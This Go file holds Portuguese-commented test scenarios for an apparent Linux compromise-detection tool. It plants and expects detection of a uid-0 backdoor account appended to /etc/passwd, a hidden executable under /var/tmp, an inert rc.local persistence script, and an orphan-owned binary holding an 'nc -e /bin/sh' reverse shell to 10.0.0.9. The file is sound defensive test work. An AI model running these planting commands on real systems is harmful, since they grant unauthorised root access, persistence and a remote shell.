package scenario

// As duas últimas lacunas com sinal do ATTACK.md.
//
//	H1  conta sem shadow      o backdoor de uma linha, e o rastro que ele deixa
//	H2  executável escondido  o que está PARADO em disco, que nenhum check via

func init() {
	Register(Scenario{
		ID:   "H1-conta-sem-shadow",
		Desc: "backdoor de uma linha no /etc/passwd: não passou pelo useradd, e o shadow prova",
		// A forma mais antiga de acesso permanente cabe num `echo`, e deixa um
		// rastro estrutural que quem a escreve quase sempre esquece: o
		// `useradd` escreve nos DOIS arquivos, sempre.
		//
		// Medido nas quatro distribuições da matriz — passwd e shadow batem
		// conta por conta, sem exceção. Divergência aqui não é variação de
		// distribuição.
		Images: matriz,
		Plant:  contaSemShadow,
		Expect: []Expect{
			{ID: "priv.account_no_shadow", Sev: "CRITICAL", Subject: "backdoor"},
			{ID: "priv.account_no_shadow", Evidence: "nunca passou por ele"},
			{ID: "priv.account_no_shadow", Evidence: "acrescentada com um `echo`"},
			// E o check de uid 0 vê a mesma conta por outro ângulo: é a
			// correlação que conta a história inteira.
			{ID: "priv.uid_zero", Sev: "CRITICAL", Subject: "backdoor"},
		},
		ExpectOutput: []string{"account_no_shadow + uid_zero"},
		Exit:         2,
	})

	Register(Scenario{
		ID:   "H2-executavel-escondido",
		Desc: "binário parado num diretório com ponto sob /var/tmp: nada precisa estar rodando",
		// Fecha um limite que estava escrito, em voz alta, no check de
		// propriedade: "um binário largado em disco e nunca executado não
		// entra — isso é a §8, e ela exige varredura de filesystem".
		//
		// A varredura já existia, para o check de privilégio. O que faltava era
		// olhar para o que ela passava na frente.
		//
		// O cenário planta TAMBÉM os hooks de exemplo do git, que vêm em modo
		// 755 e nunca são executados: sem a exclusão deles, um host com
		// diretório de build do gerenciador de pacotes rende catorze achados
		// por repositório clonado.
		Images: matriz,
		Plant:  execEscondido,
		Expect: []Expect{
			{ID: "path.hidden_exec", Sev: "WARN", Subject: "/var/tmp/.cache/sys"},
			{ID: "path.hidden_exec", Evidence: "PARADO em disco"},
			{ID: "path.hidden_exec", Evidence: "gravável por qualquer um"},
		},
		// E a NEGATIVA, que é metade do valor deste cenário: os hooks de
		// exemplo do git vêm em modo 755 e o git nunca os executa. Sem a
		// exclusão, um host com diretório de build do gerenciador de pacotes
		// rende catorze achados por repositório clonado — foi o que aconteceu
		// no primeiro host real.
		ForbidOutput: []string{".git/hooks"},
		Exit:         1,
	})
}

// ---------------------------------------------------------------------------

const contaSemShadow = `
echo 'backdoor:x:0:0::/root:/bin/bash' >> /etc/passwd
`

const execEscondido = `
mkdir -p /var/tmp/.cache/sys /var/tmp/projeto/.git/hooks
cp /helper /var/tmp/.cache/sys/kworker
chmod 755 /var/tmp/.cache/sys/kworker

# os hooks de exemplo do git: modo 755, e o git nunca os executa
for h in pre-commit post-update commit-msg; do
  printf '#!/bin/sh\nexit 0\n' > /var/tmp/projeto/.git/hooks/$h.sample
  chmod 755 /var/tmp/projeto/.git/hooks/$h.sample
done
`

// I1 nasceu de um TESTE DE MUTAÇÃO.
//
// Rebaixar de aviso para informativo o ramo do `rc.local` sem bit de execução
// passou pela suíte inteira sem ninguém reclamar — e a razão apareceu ao
// procurar: TODOS os cenários de rc.local fazem `chmod +x`. A distinção que a
// ferramenta faz de propósito nunca tinha sido exercitada.
func init() {
	Register(Scenario{
		ID:   "I1-rc-local-inerte",
		Desc: "rc.local com o mesmo payload e SEM bit de execução: inerte hoje, e um chmod o ativa",
		// O detalhe que decide, e que a ferramenta diz em voz alta: sem o bit
		// de execução o arquivo não roda. Ele continua sendo persistência
		// PLANTADA — o conteúdo está lá, e um `chmod +x` de um segundo o ativa
		// —, mas hoje não faz nada, e a severidade acompanha isso.
		//
		// O ctime do arquivo data a ativação quando ela vier, e é por isso que
		// o achado não some: o que se vê aqui é uma arma carregada e travada.
		Images: matriz,
		Plant:  rcLocalInerte,
		Expect: []Expect{
			{ID: "persist.trigger_exec", Sev: "WARN", Subject: "/etc/rc.local"},
			{ID: "persist.trigger_exec", Evidence: "INERTE hoje"},
			{ID: "persist.trigger_exec", Evidence: "chmod +x o ativa"},
		},
		Exit: 1,
	})
}

// rcLocalInerte é o mesmo conteúdo do cenário de gatilhos, sem o `chmod +x`.
const rcLocalInerte = `
printf '#!/bin/sh\n/dev/shm/agent &\nexit 0\n' > /etc/rc.local
chmod 644 /etc/rc.local
`

// O outro lado do H1: lá a conta está no passwd e não devia; aqui ela não está
// e alguma coisa ainda pertence a ela.
//
//	J2  conta apagada na faxina, e o arquivo que ficou para trás
//
// `userdel` remove a linha. Não toca em disco. Um atacante que criou conta,
// trabalhou e apagou a conta deixa arquivos cujo uid não traduz para nome
// nenhum — e é o único aviso que o sistema dá, impresso como número cru no
// `ls -l` de quem por acaso olhar.
func init() {
	Register(Scenario{
		ID:   "J2-dono-sem-conta",
		Desc: "conta removida na faxina: o binário que ficou em /usr/bin pertence a um uid que não existe",
		// Plantado sem `useradd`/`userdel` de propósito: o `chown` numérico é
		// o que sobra depois da faxina, e é exatamente o estado que a
		// ferramenta encontra num host de verdade — a conta já foi.
		//
		// O dado-só entra junto para provar a OUTRA metade da regra: sem
		// executável a mesma forma é observação, não achado. É essa distinção
		// que impede o check de acusar todo volume de contêiner do planeta.
		Images: matriz,
		Plant: `printf '#!/bin/sh\nnc -e /bin/sh 10.0.0.9 4444\n' > /usr/bin/.sysupd
			chmod 755 /usr/bin/.sysupd
			chown 1337:1337 /usr/bin/.sysupd
			mkdir -p /srv/dados
			printf 'dados' > /srv/dados/dump.rdb
			chown 4242:4242 /srv/dados/dump.rdb`,
		Expect: []Expect{
			{ID: "priv.file_owner_no_account", Sev: "CRITICAL", Subject: "uid 1337"},
			{ID: "priv.file_owner_no_account", Evidence: "/usr/bin/.sysupd"},
			{ID: "priv.file_owner_no_account", Evidence: "gerenciador de pacotes"},
			// E o dado-só sai como observação: mesmo uid órfão, outra leitura.
			{ID: "priv.file_owner_no_account", Sev: "INFO", Subject: "uid 4242"},
			{ID: "priv.file_owner_no_account", Evidence: "nenhum executável"},
			// O gid gêmeo é DOBRADO dentro do achado do uid: `chown 1337:1337`
			// deixa os dois órfãos no mesmo arquivo, e dois achados para um
			// arquivo diluiriam o crítico num aviso ao lado.
			{ID: "priv.file_owner_no_account", Evidence: "grupo privado"},
		},
		// O passo que separa conta apagada de arquivo importado precisa CHEGAR
		// ao operador, e ele mora em NextSteps — que Expect não alcança.
		// -v porque o passo seguinte só é impresso no modo verboso, e é lá que
		// o operador o encontra.
		Args:         []string{"-v"},
		ExpectOutput: []string{"getent passwd 1337"},
		Exit:         2,
	})
}
